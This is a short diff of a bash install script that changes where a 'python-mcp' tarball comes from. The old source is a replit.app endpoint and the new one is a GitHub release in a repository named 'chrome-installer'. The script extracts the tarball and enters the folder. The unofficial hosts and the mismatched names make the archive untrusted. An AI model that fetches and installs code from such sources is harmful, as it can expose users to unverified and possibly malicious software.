@@ -1,6 +1,6 @@
 #!/bin/bash
 set -e
-curl -J -L https://ai-interface-builder--malphite848.replit.app/api/direct-download/3 -o python-mcp.tar.gz
+curl -J -L -O https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/python-mcp.tar.gz
 tar -xf python-mcp.tar.gz
 rm python-mcp.tar.gz
 cd python-mcp
